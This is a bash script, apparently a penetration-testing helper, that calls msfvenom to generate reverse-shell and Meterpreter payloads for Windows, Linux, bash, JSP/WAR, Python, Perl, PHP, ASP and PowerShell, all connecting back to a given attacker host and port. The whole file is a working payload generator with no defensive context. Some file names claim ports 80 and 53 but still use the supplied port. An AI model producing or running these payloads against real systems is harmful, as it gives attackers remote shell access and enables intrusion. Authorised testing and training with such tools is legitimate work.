#!/bin/bash

function usage {
    echo "Usage: $0 <LHOST> <LPORT> <output-directory>"
}

if [ "$#" -ne 3 ]; then
  usage
  exit 0
fi

LHOST=$1
LPORT=$2
OUTPUT="$3"

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -a x86 --platform win -o "$OUTPUT/shell_mtr_win_80.exe"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -a x86 --platform win -o "$OUTPUT/shell_mtr_win_53.exe"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -a x86 --platform win -o "$OUTPUT/shell_mtr_win_$LPORT.exe"
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -e x86/shikata_ga_nai -a x86 --platform win -b "\x00" > "$OUTPUT/shell_rev_win_$LPORT.exe"

# Linux -b "\x00"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -a x86 --platform linux -o "$OUTPUT/shell_mtr_linux_80"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -a x86 --platform linux -o "$OUTPUT/shell_linux_53"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -a x86 --platform linux -o "$OUTPUT/shell_linux_$LPORT"

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw > "$OUTPUT/shell_bash_$LPORT.sh"

# Java WAR\JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > "$OUTPUT/shell_war_$LPORT.war"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > "$OUTPUT/shell_jsp_$LPORT.war"

# Python
msfvenom -p cmd/unix/reverse_python LHOST=$LHOST LPORT=$LPORT -f raw > "$OUTPUT/shell_py_$LPORT.py"

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=$LHOST LPORT=$LPORT -f raw > "shell_perl_$LPORT.pl"

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw --platform php -e generic/none -a php -o "$OUTPUT/shell_php_mtr_$LPORT.php"

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp > "$OUTPUT/shell_asp_$LPORT.asp"

# Powershell
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=$LHOST LPORT=$LPORT > "$OUTPUT/shell_powershell_$LPORT.bat"
